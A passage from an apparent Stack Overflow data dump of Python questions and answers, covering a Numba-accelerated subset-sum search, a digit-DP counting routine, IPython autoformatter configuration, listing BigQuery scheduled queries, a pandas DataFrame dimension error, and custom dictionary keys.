        &quot;&quot;&quot;Return true if any of the prime factors represented in factor_mask
        have corresponding remainder 0 (i.e., divide the sum of fourth powers)&quot;&quot;&quot;

        return any((factor_mask &amp; (1 &lt;&lt; i) != 0
                    and remainder % primes[i] == 0)
                   for i in range(4))

    prefix_less_than = [Counter() for _ in range(16)]

    # Empty string
    prefix_equal = (0, 0)

    for digit_pos, digit in enumerate(digits):

        new_prefix_less_than = [Counter() for _ in range(16)]

        # Old &quot;lesser than&quot; prefixes stay lesser
        for fac_mask, fac_mask_counts in enumerate(prefix_less_than):
            for new_digit in range(1, 10):
                new_mask = fac_mask | factor_masks[new_digit]
                remainder_change = digit_to_remainders[new_digit]
                for old_remainder, old_count in fac_mask_counts.items():
                    new_remainder = (remainder_change + old_remainder) % prime_product
                    new_prefix_less_than[new_mask][new_remainder] += old_count

        if digit == 0:
            prefix_equal = None

        if prefix_equal is not None:
            equal_fac_mask, equal_remainder = prefix_equal
            for new_digit in range(1, digit):

                new_mask = equal_fac_mask | factor_masks[new_digit]

                remainder_change = digit_to_remainders[new_digit]
                new_remainder = (remainder_change + equal_remainder) % prime_product

                new_prefix_less_than[new_mask][new_remainder] += 1

            new_mask = equal_fac_mask | factor_masks[digit]
            remainder_change = digit_to_remainders[digit]

            new_remainder = (remainder_change + equal_remainder) % prime_product
            prefix_equal = (new_mask, new_remainder)

        prefix_less_than = new_prefix_less_than

        if digit_pos == len(digits) - 1:
            break

        # Empty string
        prefix_less_than[0][0] += 1

    for fac_mask, fac_mask_counts in enumerate(prefix_less_than):
        for remainder, rem_count in fac_mask_counts.items():
            if not is_fac_mask_mod_special(factor_mask=fac_mask,
                                           remainder=remainder):
                total_non_special += rem_count

    if prefix_equal is not None:
        if not is_fac_mask_mod_special(*prefix_equal):
            total_non_special += 1

    return 1 + int(''.join(map(str, digits))) - total_non_special
</code></pre>
<p>Example usage:</p>
<pre class=""lang-py prettyprint-override""><code>print(f&quot;{count_special_less_equal(digits_of(120))}&quot;)
</code></pre>
<p>prints</p>
<pre class=""lang-py prettyprint-override""><code>57
</code></pre>
<p>and</p>
<pre class=""lang-py prettyprint-override""><code>for exponent in range(1, 19):
    print(f&quot;Count up to 10^{exponent}: {count_special_less_equal(digits_of(10**exponent))}&quot;)
</code></pre>
<p>gives:</p>
<pre class=""lang-py prettyprint-override""><code>Count up to 10^1: 8
Count up to 10^2: 42
Count up to 10^3: 592
Count up to 10^4: 7400
Count up to 10^5: 79118
Count up to 10^6: 854190
Count up to 10^7: 8595966
Count up to 10^8: 86010590
Count up to 10^9: 866103492
Count up to 10^10: 8811619132
Count up to 10^11: 92967009216
Count up to 10^12: 929455398976
Count up to 10^13: 9268803096820
Count up to 10^14: 92838342330554
Count up to 10^15: 933105194955392
Count up to 10^16: 9557298732021784
Count up to 10^17: 96089228976983058
Count up to 10^18: 960712913414545906

Done in 0.3783 seconds
</code></pre>
<p>This finds the frequencies for all powers of 10 up to <code>10^18</code> in about a third of a second. It's possible to optimize this further in the constant factors, using numpy arrays or other tricks (like precomputing the counts for all numbers with a fixed number of digits).</p>
"
"71527595","1","Efficiently count all the combinations of numbers having a sum close to 0","<p>I have following pandas dataframe
df</p>
<pre><code>column1 column2 list_numbers          sublist_column
x        y      [10,-6,1,-4]             
a        b      [1,3,7,-2]               
p        q      [6,2,-3,-3.2]             
</code></pre>
<p>the sublist_column will contain the numbers from the column &quot;list_numbers&quot; that adds up to 0 (0.5 is a tolerance)
I have written following code.</p>
<pre><code>def return_list(original_lst,target_sum,tolerance):
    memo=dict()
    sublist=[]
    for i, x in enumerate(original_lst):
    
        if memo_func(original_lst, i + 1, target_sum - x, memo,tolerance) &gt; 0:
            sublist.append(x)
            target_sum -= x          
    return sublist  

def memo_func(original_lst, i, target_sum, memo,tolerance):
    
    if i &gt;= len(original_lst):
        if target_sum &lt;=tolerance and target_sum&gt;=-tolerance:
            return 1
        else:
            return 0
    if (i, target_sum) not in memo:  
        c = memo_func(original_lst, i + 1, target_sum, memo,tolerance)
        c += memo_func(original_lst, i + 1, target_sum - original_lst[i], memo,tolerance)
        memo[(i, target_sum)] = c  
    return memo[(i, target_sum)]    
    
</code></pre>
<p>Then I am using the &quot;return_list&quot; function on the &quot;sublist_column&quot; to populate the result.</p>
<pre><code>target_sum = 0
tolerance=0.5

df['sublist_column']=df['list_numbers'].apply(lambda x: return_list(x,0,tolerance))
</code></pre>
<p>the following will be the resultant dataframe</p>
<pre><code>column1 column2 list_numbers          sublist_column
x        y      [10,-6,1,-4]             [10,-6,-4]
a        b      [1,3,7,-2]               []
p        q      [6,2,-3,-3.2]            [6,-3,-3.2]  #sum is -0.2(within the tolerance)
</code></pre>
<p>This is giving me correct result but it's very slow(takes 2 hrs to run if i use spyder IDE), as my dataframe size has roughly 50,000 rows, and the length of some of the lists in the &quot;list_numbers&quot; column is more than 15.
The running time is particularly getting affected when the number of elements in the lists in the &quot;list_numbers&quot; column is greater than 15.
e.g following list is taking almost 15 minutes to process</p>
<pre><code>[-1572.35,-76.16,-261.1,-7732.0,-1634.0,-52082.42,-3974.15,
-801.65,-30192.79,-671.98,-73.06,-47.72,57.96,-511.18,-391.87,-4145.0,-1008.61,
-17.53,-17.53,-1471.08,-119.26,-2269.7,-2709,-182939.59,-19.48,-516,-6875.75,-138770.16,-71.11,-295.84,-348.09,-3460.71,-704.01,-678,-632.15,-21478.76]
</code></pre>
<p>How can i significantly improve my running time?</p>
","71551035","<h2>Step 1: using Numba</h2>
<p>Based on the comments, it appear that <code>memo_func</code> is the main bottleneck. You can use Numba to speed up its execution. Numba compile the Python code to a native one thanks to a just-in-time (JIT) compiler. The JIT is able to perform tail-call optimizations and native function calls are significantly faster than the one of CPython. Here is an example:</p>
<pre class=""lang-py prettyprint-override""><code>import numba as nb

@nb.njit('(float64[::1], int64, float64, float64)')
def memo_func(original_arr, i, target_sum, tolerance):
    if i &gt;= len(original_arr):
        if -tolerance &lt;= target_sum &lt;= tolerance:
            return 1
        return 0
    c = memo_func(original_arr, i + 1, target_sum, tolerance)
    c += memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)
    return c

@nb.njit('(float64[::1], float64, float64)')
def return_list(original_arr, target_sum, tolerance):
    sublist = []
    for i, x in enumerate(original_arr):
        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance) &gt; 0:
            sublist.append(x)
            target_sum -= x
    return sublist
</code></pre>
<p>Using memoization does not seems to speed up the result and this is a bit cumbersome to implement in Numba. In fact, there are much better ways to improve the algorithm.</p>
<p>Note that you need to convert the lists in Numpy array before calling the functions:</p>
<pre class=""lang-py prettyprint-override""><code>lst = [-850.85,-856.05,-734.09,5549.63,77.59,-39.73,23.63,13.93,-6455.54,-417.07,176.72,-570.41,3621.89,-233.47,-471.54,-30.33,-941.49,-1014.6,1614.5]
result = return_list(np.array(lst, np.float64), 0, tolerance)
</code></pre>
<hr />
<h2>Step 2: tail call optimization</h2>
<p>Calling many function to compute the right part of the input list is not efficient. The JIT is able to reduce the number of all but it is not able to completely remove them. You can unroll all the call when the depth of the tail calls is big. For example, when there is 6 items to compute, you can use this following code:</p>
<pre class=""lang-py prettyprint-override""><code>if n-i == 6:
    c = 0
    s0 = target_sum
    v0, v1, v2, v3, v4, v5 = original_arr[i:]
    for s1 in (s0, s0 - v0):
        for s2 in (s1, s1 - v1):
            for s3 in (s2, s2 - v2):
                for s4 in (s3, s3 - v3):
                    for s5 in (s4, s4 - v4):
                        for s6 in (s5, s5 - v5):
                            c += np.int64(-tolerance &lt;= s6 &lt;= tolerance)
    return c
</code></pre>
<p>This is pretty ugly but far more efficient since the JIT is able to unroll all the loop and produce a very fast code. Still, this is not enough for large lists.</p>
<hr />
<h2>Step 3: better algorithm</h2>
<p>For large input lists, the problem is the <strong>exponential complexity of the algorithm</strong>. The thing is this problem looks really like a relaxed variant of <a href=""https://en.wikipedia.org/wiki/Subset_sum_problem"" rel=""nofollow noreferrer"">subset-sum</a> which is known to be <a href=""https://en.wikipedia.org/wiki/NP-completeness"" rel=""nofollow noreferrer""><strong>NP-complete</strong></a>. Such class of algorithm is known to be very hard to solve. The best exact practical algorithms known so far to solve NP-complete problem are exponential. Put it shortly, this means that for any sufficiently large input, there is no known algorithm capable of finding an exact solution in a reasonable time (eg. less than the lifetime of a human).</p>
<p>That being said, there are heuristics and strategies to improve the complexity of the current algorithm. One efficient approach is to use a <a href=""https://en.wikipedia.org/wiki/Knapsack_problem#Meet-in-the-middle"" rel=""nofollow noreferrer""><strong>meet-in-the-middle</strong></a> algorithm. When applied to your use-case, the idea is to generate a large set of target sums, then sort them, and then use a binary search to find the number of matching values. This is possible here since <code>-tolerance &lt;= target_sum &lt;= tolerance</code> where <code>target_sum = partial_sum1 + partial_sum2</code> is equivalent to <code>-tolerance + partial_sum2 &lt;= partial_sum1 &lt;= tolerance + partial_sum2</code>.</p>
<p>The resulting code is unfortunately quite big and not trivial, but this is certainly the cost to pay for trying to solve efficiently a complex problem like this one. Here it is:</p>
<pre class=""lang-py prettyprint-override""><code># Generate all the target sums based on in_arr and put the result in out_sum
@nb.njit('(float64[::1], float64[::1], float64)', cache=True)
def gen_all_comb(in_arr, out_sum, target_sum):
    assert in_arr.size &gt;= 6
    if in_arr.size == 6:
        assert out_sum.size == 64
        v0, v1, v2, v3, v4, v5 = in_arr
        s0 = target_sum
        cur = 0
        for s1 in (s0, s0 - v0):
            for s2 in (s1, s1 - v1):
                for s3 in (s2, s2 - v2):
                    for s4 in (s3, s3 - v3):
                        for s5 in (s4, s4 - v4):
                            for s6 in (s5, s5 - v5):
                                out_sum[cur] = s6
                                cur += 1
    else:
        assert out_sum.size % 2 == 0
        mid = out_sum.size // 2
        gen_all_comb(in_arr[1:], out_sum[:mid], target_sum)
        gen_all_comb(in_arr[1:], out_sum[mid:], target_sum - in_arr[0])

# Find the number of item in sorted_arr where:
# lower_bound &lt;= item &lt;= upper_bound
@nb.njit('(float64[::1], float64, float64)', cache=True)
def count_between(sorted_arr, lower_bound, upper_bound):
    assert lower_bound &lt;= upper_bound
    lo_pos = np.searchsorted(sorted_arr, lower_bound, side='left')
    hi_pos = np.searchsorted(sorted_arr, upper_bound, side='right')
    return hi_pos - lo_pos

# Count all the target sums in:
# -tolerance &lt;= all_target_sums(in_arr,sorted_target_sums)-s0 &lt;= tolerance
@nb.njit('(float64[::1], float64[::1], float64, float64)', cache=True)
def multi_search(in_arr, sorted_target_sums, tolerance, s0):
    assert in_arr.size &gt;= 6
    if in_arr.size == 6:
        v0, v1, v2, v3, v4, v5 = in_arr
        c = 0
        for s1 in (s0, s0 + v0):
            for s2 in (s1, s1 + v1):
                for s3 in (s2, s2 + v2):
                    for s4 in (s3, s3 + v3):
                        for s5 in (s4, s4 + v4):
                            for s6 in (s5, s5 + v5):
                                lo = -tolerance + s6
                                hi = tolerance + s6
                                c += count_between(sorted_target_sums, lo, hi)
        return c
    else:
        c = multi_search(in_arr[1:], sorted_target_sums, tolerance, s0)
        c += multi_search(in_arr[1:], sorted_target_sums, tolerance, s0 + in_arr[0])
        return c

@nb.njit('(float64[::1], int64, float64, float64)', cache=True)
def memo_func(original_arr, i, target_sum, tolerance):
    n = original_arr.size
    remaining = n - i
    tail_size = min(max(remaining//2, 7), 16)

    # Tail call: for very small list (trivial case)
    if remaining &lt;= 0:
        return np.int64(-tolerance &lt;= target_sum &lt;= tolerance)

    # Tail call: for big lists (better algorithm)
    elif remaining &gt;= tail_size*2:
        partial_sums = np.empty(2**tail_size, dtype=np.float64)
        gen_all_comb(original_arr[-tail_size:], partial_sums, target_sum)
        partial_sums.sort()
        return multi_search(original_arr[-remaining:-tail_size], partial_sums, tolerance, 0.0)

    # Tail call: for medium-sized list (unrolling)
    elif remaining == 6:
        c = 0
        s0 = target_sum
        v0, v1, v2, v3, v4, v5 = original_arr[i:]
        for s1 in (s0, s0 - v0):
            for s2 in (s1, s1 - v1):
                for s3 in (s2, s2 - v2):
                    for s4 in (s3, s3 - v3):
                        for s5 in (s4, s4 - v4):
                            for s6 in (s5, s5 - v5):
                                c += np.int64(-tolerance &lt;= s6 &lt;= tolerance)
        return c

    # Recursion
    c = memo_func(original_arr, i + 1, target_sum, tolerance)
    c += memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)
    return c

@nb.njit('(float64[::1], float64, float64)', cache=True)
def return_list(original_arr, target_sum, tolerance):
    sublist = []
    for i, x in enumerate(original_arr):
        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance) &gt; 0:
            sublist.append(x)
            target_sum -= x
    return sublist
</code></pre>
<p>Note that the code takes few seconds to compile since it is quite big. The cache should help not to recompile it every time.</p>
<hr />
<h2>Step 4: even better algorithm</h2>
<p>The previous code count the number of matching values (the value stored in <code>c</code>). This is not needed since we just want to know if 1 value exists (ie. <code>memo_func(...) &gt; 0</code>). As a result, we can return a boolean to define if a value has been found and optimize the algorithm so to directly return <code>True</code> when some early solutions are found. Big parts of the exploration tree can be skipped with this method (which is particularly efficient when there are many possible solutions like on random arrays).</p>
<p>Another optimization is then to perform only one binary search (instead of two) and check before if the searched values can be found in the min-max range of the sorted array (so to skip this trivial case before applying the expensive binary search). This is possible because of the previous optimization.</p>
<p>A final optimization is to early discard a part the exploration tree when the values generated by <code>multi_search</code> are so small/big that we can be sure there is no need to perform a binary search. This can be done by computing a pessimistic over-approximation of the searched values. This is especially useful in pathological cases that have almost no solutions.</p>
<p>Here is the <strong>final implementation</strong>:</p>
<pre class=""lang-py prettyprint-override""><code>@nb.njit('(float64[::1], float64[::1], float64)', cache=True)
def gen_all_comb(in_arr, out_sum, target_sum):
    assert in_arr.size &gt;= 6
    if in_arr.size == 6:
        assert out_sum.size == 64
        v0, v1, v2, v3, v4, v5 = in_arr
        s0 = target_sum
        cur = 0
        for s1 in (s0, s0 - v0):
            for s2 in (s1, s1 - v1):
                for s3 in (s2, s2 - v2):
                    for s4 in (s3, s3 - v3):
                        for s5 in (s4, s4 - v4):
                            for s6 in (s5, s5 - v5):
                                out_sum[cur] = s6
                                cur += 1
    else:
        assert out_sum.size % 2 == 0
        mid = out_sum.size // 2
        gen_all_comb(in_arr[1:], out_sum[:mid], target_sum)
        gen_all_comb(in_arr[1:], out_sum[mid:], target_sum - in_arr[0])

# Find the number of item in sorted_arr where:
# lower_bound &lt;= item &lt;= upper_bound
@nb.njit('(float64[::1], float64, float64)', cache=True)
def has_items_between(sorted_arr, lower_bound, upper_bound):
    if upper_bound &lt; sorted_arr[0] or sorted_arr[sorted_arr.size-1] &lt; lower_bound:
        return False
    lo_pos = np.searchsorted(sorted_arr, lower_bound, side='left')
    return lo_pos &lt; sorted_arr.size and sorted_arr[lo_pos] &lt;= upper_bound

# Count all the target sums in:
# -tolerance &lt;= all_target_sums(in_arr,sorted_target_sums)-s0 &lt;= tolerance
@nb.njit('(float64[::1], float64[::1], float64, float64)', cache=True)
def multi_search(in_arr, sorted_target_sums, tolerance, s0):
    assert in_arr.size &gt;= 6
    if in_arr.size == 6:
        v0, v1, v2, v3, v4, v5 = in_arr
        x3, x4, x5 = min(v3, 0), min(v4, 0), min(v5, 0)
        y3, y4, y5 = max(v3, 0), max(v4, 0), max(v5, 0)
        mini = sorted_target_sums[0]
        maxi = sorted_target_sums[sorted_target_sums.size-1]

        for s1 in (s0, s0 + v0):
            for s2 in (s1, s1 + v1):
                for s3 in (s2, s2 + v2):
                    # Prune the exploration tree early if a 
                    # larger range cannot be found.
                    lo = s3 + (x3 + x4 + x5 - tolerance)
                    hi = s3 + (y3 + y4 + y5 + tolerance)
                    if hi &lt; mini or maxi &lt; lo:
                        continue

                    for s4 in (s3, s3 + v3):
                        for s5 in (s4, s4 + v4):
                            for s6 in (s5, s5 + v5):
                                lo = -tolerance + s6
                                hi = tolerance + s6
                                if has_items_between(sorted_target_sums, lo, hi):
                                    return True
        return False
    return (
        multi_search(in_arr[1:], sorted_target_sums, tolerance, s0)
        or multi_search(in_arr[1:], sorted_target_sums, tolerance, s0 + in_arr[0])
    )

@nb.njit('(float64[::1], int64, float64, float64)', cache=True)
def memo_func(original_arr, i, target_sum, tolerance):
    n = original_arr.size
    remaining = n - i
    tail_size = min(max(remaining//2, 7), 13)

    # Tail call: for very small list (trivial case)
    if remaining &lt;= 0:
        return -tolerance &lt;= target_sum &lt;= tolerance

    # Tail call: for big lists (better algorithm)
    elif remaining &gt;= tail_size*2:
        partial_sums = np.empty(2**tail_size, dtype=np.float64)
        gen_all_comb(original_arr[-tail_size:], partial_sums, target_sum)
        partial_sums.sort()
        return multi_search(original_arr[-remaining:-tail_size], partial_sums, tolerance, 0.0)

    # Tail call: for medium-sized list (unrolling)
    elif remaining == 6:
        s0 = target_sum
        v0, v1, v2, v3, v4, v5 = original_arr[i:]
        for s1 in (s0, s0 - v0):
            for s2 in (s1, s1 - v1):
                for s3 in (s2, s2 - v2):
                    for s4 in (s3, s3 - v3):
                        for s5 in (s4, s4 - v4):
                            for s6 in (s5, s5 - v5):
                                if -tolerance &lt;= s6 &lt;= tolerance:
                                    return True
        return False

    # Recursion
    return (
        memo_func(original_arr, i + 1, target_sum, tolerance)
        or memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)
    )

@nb.njit('(float64[::1], float64, float64)', cache=True)
def return_list(original_arr, target_sum, tolerance):
    sublist = []
    for i, x in enumerate(original_arr):
        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance):
            sublist.append(x)
            target_sum -= x
    return sublist
</code></pre>
<p>This final implementation is meant to efficiently compute pathological cases (the one where there is only few non-trivial solutions or even no solutions like on the big provided input lists). However, it can can be tuned so to compute faster the cases where there are many solutions (like on large random uniformly-distributed arrays) at the expense of a significantly slower execution on the pathological cases. This tread-off can be set by changing the variable <code>tail_size</code> (smaller values are better for cases with more solutions).</p>
<hr />
<h2>Benchmark</h2>
<p>Here is the tested inputs:</p>
<pre class=""lang-py prettyprint-override""><code>target_sum = 0
tolerance = 0.5

small_lst = [-850.85,-856.05,-734.09,5549.63,77.59,-39.73,23.63,13.93,-6455.54,-417.07,176.72,-570.41,3621.89,-233.47,-471.54,-30.33,-941.49,-1014.6,1614.5]
big_lst = [-1572.35,-76.16,-261.1,-7732.0,-1634.0,-52082.42,-3974.15,-801.65,-30192.79,-671.98,-73.06,-47.72,57.96,-511.18,-391.87,-4145.0,-1008.61,-17.53,-17.53,-1471.08,-119.26,-2269.7,-2709,-182939.59,-19.48,-516,-6875.75,-138770.16,-71.11,-295.84,-348.09,-3460.71,-704.01,-678,-632.15,-21478.76]
random_lst = [-86145.13, -34783.33, 50912.99, -87823.73, 37537.52, -22796.4, 53530.74, 65477.91, -50725.36, -52609.35, 92769.95, 83630.42, 30436.95, -24347.08, -58197.95, 77504.44, 83958.08, -85095.73, -61347.26, -14250.65, 2012.91, 83969.32, -69356.41, 29659.23, 94736.29, 2237.82, -17784.34, 23079.36, 8059.84, 26751.26, 98427.46, -88735.07, -28936.62, 21868.77, 5713.05, -74346.18]
</code></pre>
<p>The uniformly-distributed random list has a very large number of solutions while the provided big list has none. The tuned final implementation set <code>tail_size</code> to <code>min(max(remaining//2, 7), 13)</code> so to compute the random list much faster at the expense of a significantly slower execution on the big list.</p>

<p>Here is the timing with the <em>small</em> list on my machine:</p>
<pre class=""lang-none prettyprint-override""><code>Naive python algorithm:               173.45 ms
Naive algorithm using Numba:            7.21 ms
Tail call optimization + Numba:         0.33 ms
KellyBundy's implementation:            0.19 ms
Efficient algorithm + optim + Numba:    0.10 ms
Final implementation (tuned):           0.05 ms
Final implementation (default):         0.05 ms
</code></pre>
<p>Here is the timing with the large <em>random</em> list on my machine (easy case):</p>
<pre class=""lang-none prettyprint-override""><code>Efficient algorithm + optim + Numba:    209.61 ms
Final implementation (default):           4.11 ms
KellyBundy's implementation:              1.15 ms
Final implementation (tuned):             0.85 ms

Other algorithms are not shown here because they are too slow (see below)
</code></pre>
<p>Here is the timing with the <em>big</em> list on my machine (challenging case):</p>
<pre class=""lang-none prettyprint-override""><code>Naive python algorithm:               &gt;20000 s    [estimation &amp; out of memory]
Naive algorithm using Numba:            ~900 s    [estimation]
Tail call optimization + Numba:           42.61 s
KellyBundy's implementation:               0.671 s
Final implementation (tuned):              0.078 s
Efficient algorithm + optim + Numba:       0.051 s
Final implementation (default):            0.013 s
</code></pre>
<p>Thus, the final implementation is up to <strong>~3500 times faster</strong> on the small input and <strong>more than 1_500_000 times faster</strong> on the large input! It also use <strong>far less RAM</strong> so it can actually be executed on a cheap PC.</p>
<p>It is worth noting that the execution time can be reduced even further be using multiple thread so to reach a speed up &gt;5_000_000 though it may be slower on small inputs and it will make the code a bit complex.</p>
<hr />
"
"71969299","1","How to disable code formatting in ipython?","<p>IPython has this new feature that reformats my prompt. Unfortunately, it is really buggy, so I want to disable it. I managed to do it when starting IPython from the command line by adding the following line in my <code>ipython_config.py</code>:</p>
<pre class=""lang-py prettyprint-override""><code>c.TerminalInteractiveShell.autoformatter = None
</code></pre>
<p>However, it does not work when I run it from a python script. I start IPython from my script the following way:</p>
<pre class=""lang-py prettyprint-override""><code>c = traitlets.config.get_config()
c.InteractiveShellEmbed.colors = &quot;Linux&quot;
c.TerminalInteractiveShell.autoformatter = None
c.InteractiveShellEmbed.loop_runner = lambda coro: loop.run_until_complete(coro)
IPython.embed(display_banner='', using='asyncio', config=c)
</code></pre>
<p>If I change the <code>colors</code> value, the colors change accordingly, so the configuration itself works. However, no matter what I do with <code>autoformatter</code>, IPython autoformats my code regardless. What am I doing wrong?</p>
","71995927","<p>Apparently, the answer is:</p>
<pre class=""lang-py prettyprint-override""><code>c.InteractiveShellEmbed.autoformatter = None
</code></pre>
"
"71424233","1","How do I list my scheduled queries via the Python google client API?","<p>I have set up my service account and I can run queries on bigQuery using <code>client.query()</code>.</p>
<p>I could just write all my scheduled queries into this new <code>client.query()</code> format but I already have many scheduled queries so I was wondering if there is a way I can get/list the scheduled queries and then use that information to run those queries from a script.</p>
<p><a href=""https://i.stack.imgur.com/sq7qz.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sq7qz.png"" alt=""I can query with big Query but I want to list queries"" /></a></p>
","71428499","<p>Yes, you can use the APIs. When you don't know which one to use, I have a tip. Use the command proposed by @Yev</p>
<p><code>bq ls --transfer_config --transfer_location=US --format=prettyjson</code></p>
<p>But log the API calls. for that use the <code>--apilog &lt;logfile name&gt;</code> parameter like that</p>
<p><code>bq --apilog ./log ls --transfer_config --transfer_location=US --format=prettyjson</code></p>
<p>And, magically, you can find the API called by the command:
<code>https://bigquerydatatransfer.googleapis.com/v1/projects/&lt;PROJECT-ID&gt;/locations/US/transferConfigs?alt=json</code></p>
<p>Then, a simple google search leads you to the <a href=""https://cloud.google.com/bigquery-transfer/docs/reference/datatransfer/rest/v1/projects.locations.transferConfigs/list"" rel=""noreferrer"">correct documentation</a></p>
<hr />
<p>In python, add that dependencies in your <code>requirements.txt</code>: <code>google-cloud-bigquery-datatransfer</code> and use that code</p>
<pre><code>from google.cloud import bigquery_datatransfer

client = bigquery_datatransfer.DataTransferServiceClient()
parent = client.common_project_path(&quot;&lt;PROJECT-ID&gt;&quot;)
resp = client.list_transfer_configs(parent=parent)
print(resp)
</code></pre>
"
"71577514","1","ValueError: Per-column arrays must each be 1-dimensional when trying to create a pandas DataFrame from a dictionary. Why?","<p>I'm trying to create a very simple Pandas DataFrame from a dictionary. The dictionary has 3 items, and the DataFrame as well. They are:</p>
<ul>
<li>a list with the 'shape' (3,)</li>
<li>a list/np.array (in different attempts) with the shape(3, 3)</li>
<li>a constant of 100 (same value to the whole column)</li>
</ul>
<ol>
<li>Here is the code that succeeds and displays the preferred df</li>
</ol>
<p>​</p>
<pre><code># from a dicitionary
&gt;&gt;&gt;dict1 = {&quot;x&quot;: [1, 2, 3],
...         &quot;y&quot;: list(
...             [
...                 [2, 4, 6], 
...                 [3, 6, 9], 
...                 [4, 8, 12]
...             ]
...             ),
...         &quot;z&quot;: 100}

&gt;&gt;&gt;df1 = pd.DataFrame(dict1)
&gt;&gt;&gt;df1
   x           y    z
0  1   [2, 4, 6]  100
1  2   [3, 6, 9]  100
2  3  [4, 8, 12]  100
</code></pre>
<ol start=""2"">
<li>But then I assign a Numpy ndarray (shape 3, 3 )to the key <code>y</code>, and try to create a DataFrame from the dictionary. The line I try to create the DataFrame errors out. Below is the code I try to run, and the error I get (in separate code blocks for ease of reading.)</li>
</ol>
<ul>
<li>code</li>
</ul>
<p>​</p>
<pre><code>&gt;&gt;&gt;dict2 = {&quot;x&quot;: [1, 2, 3],
...         &quot;y&quot;: np.array(
...             [
...                 [2, 4, 6], 
...                 [3, 6, 9], 
...                 [4, 8, 12]
...             ]
...             ),
...         &quot;z&quot;: 100}

&gt;&gt;&gt;df2 = pd.DataFrame(dict2)  # see the below block for error
</code></pre>
<ul>
<li>error</li>
</ul>
<p>​</p>
<pre><code>---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)
d:\studies\compsci\pyscripts\study\pandas-realpython\data-delightful\01.intro.ipynb Cell 10' in &lt;module&gt;
      1 # from a dicitionary
      2 dict1 = {&quot;x&quot;: [1, 2, 3],
      3          &quot;y&quot;: np.array(
      4              [
   (...)
      9              ),
     10          &quot;z&quot;: 100}
---&gt; 12 df1 = pd.DataFrame(dict1)

File ~\anaconda3\envs\dst\lib\site-packages\pandas\core\frame.py:636, in DataFrame.__init__(self, data, index, columns, dtype, copy)
    630     mgr = self._init_mgr(
    631         data, axes={&quot;index&quot;: index, &quot;columns&quot;: columns}, dtype=dtype, copy=copy
    632     )
    634 elif isinstance(data, dict):
    635     # GH#38939 de facto copy defaults to False only in non-dict cases
--&gt; 636     mgr = dict_to_mgr(data, index, columns, dtype=dtype, copy=copy, typ=manager)
    637 elif isinstance(data, ma.MaskedArray):
    638     import numpy.ma.mrecords as mrecords

File ~\anaconda3\envs\dst\lib\site-packages\pandas\core\internals\construction.py:502, in dict_to_mgr(data, index, columns, dtype, typ, copy)
    494     arrays = [
    495         x
    496         if not hasattr(x, &quot;dtype&quot;) or not isinstance(x.dtype, ExtensionDtype)
    497         else x.copy()
    498         for x in arrays
    499     ]
    500     # TODO: can we get rid of the dt64tz special case above?
--&gt; 502 return arrays_to_mgr(arrays, columns, index, dtype=dtype, typ=typ, consolidate=copy)

File ~\anaconda3\envs\dst\lib\site-packages\pandas\core\internals\construction.py:120, in arrays_to_mgr(arrays, columns, index, dtype, verify_integrity, typ, consolidate)
    117 if verify_integrity:
    118     # figure out the index, if necessary
    119     if index is None:
--&gt; 120         index = _extract_index(arrays)
    121     else:
    122         index = ensure_index(index)

File ~\anaconda3\envs\dst\lib\site-packages\pandas\core\internals\construction.py:661, in _extract_index(data)
    659         raw_lengths.append(len(val))
    660     elif isinstance(val, np.ndarray) and val.ndim &gt; 1:
--&gt; 661         raise ValueError(&quot;Per-column arrays must each be 1-dimensional&quot;)
    663 if not indexes and not raw_lengths:
    664     raise ValueError(&quot;If using all scalar values, you must pass an index&quot;)

ValueError: Per-column arrays must each be 1-dimensional
</code></pre>
<p>Why is it ending in error like that in the second attempt, even though the dimensions of both arrays are the same? What is a workaround for this issue?</p>
","71580136","<p>If you look closer at the error message and quick look at the source code <a href=""https://github.com/pandas-dev/pandas/blob/75ca237138946e81b4db938546dbe35a15482f41/pandas/core/internals/construction.py#L651"" rel=""noreferrer"">here</a>:</p>
<pre><code>    elif isinstance(val, np.ndarray) and val.ndim &gt; 1:
        raise ValueError(&quot;Per-column arrays must each be 1-dimensional&quot;)
</code></pre>
<p>You will find that if the dictionay value is a numpy array and has more than one dimension as your example, it throws an error based on the source code. Therefore, it works very well with list because a list has no more than one dimension even if it is a list of list.</p>
<pre><code>lst = [[1,2,3],[4,5,6],[7,8,9]]
len(lst) # print 3 elements or (3,) not (3,3) like numpy array.
</code></pre>
<p>You can try to use np.array([1,2,3]), it will work because number of dimensions is 1 and try:</p>
<pre><code>arr = np.array([1,2,3])
print(arr.ndim)  # output is 1
</code></pre>
<p>If it is necessary to use numpy array inside a dictionary, you can use <code>.tolist()</code> to convert numpy array to a list.</p>
"
"72002559","1","Converting object to dictionary key","<p>I was wondering if there is an easy way to essentially have multiple keys in a dictionary for one value. An example of what I would like to achieve is as following:</p>
<pre class=""lang-py prettyprint-override""><code>class test:
    key=&quot;test_key&quot;
    
    def __str__(self):
        return self.key

tester = test()

dictionary = {}
dictionary[tester] = 1

print(dictionary[tester])
print(dictionary[&quot;test_key&quot;])
</code></pre>
<p>where the output would be:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; 1
&gt;&gt;&gt; 1
</code></pre>
<p>What I'm looking for is a way to automatically convert the object to a string before its used as a key. Is this possible?</p>
","72002684","<p>Personally, I think it's better to explicitly cast the object to a string, e.g.</p>
<pre class=""lang-py prettyprint-override""><code>dictionary[str(tester)] = 1
</code></pre>
<p>That being said, if you're <em>really</em> <em><strong>really</strong></em> <em><strong>REALLY</strong></em> sure you want to do this, define the <code>__hash__</code> and <code>__eq__</code> dunder methods. No need to create a new data structure or change the existing code outside of the class definition:</p>
<pre class=""lang-py prettyprint-override""><code>class test:
    key=&quot;test_key&quot;
    
    def __hash__(self):
        return hash(self.key)
        
    def __eq__(self, other):
        if isinstance(other, str):
            return self.key == other
        return self.key == other.key
    
    def __str__(self):
        return self.key
</code></pre>
<p>This will output:</p>
<pre class=""lang-py prettyprint-override""><code>1
1
</code></pre>
"
"71583528","1","Python extracting string","<p>I have a dataframe where one of the columns which is in string format looks like this</p>
<pre><code>    filename
 0  Machine02-2022-01-28_00-21-45.blf.424
 1  Machine02-2022-01-28_00-21-45.blf.425
 2  Machine02-2022-01-28_00-21-45.blf.426
 3  Machine02-2022-01-28_00-21-45.blf.427
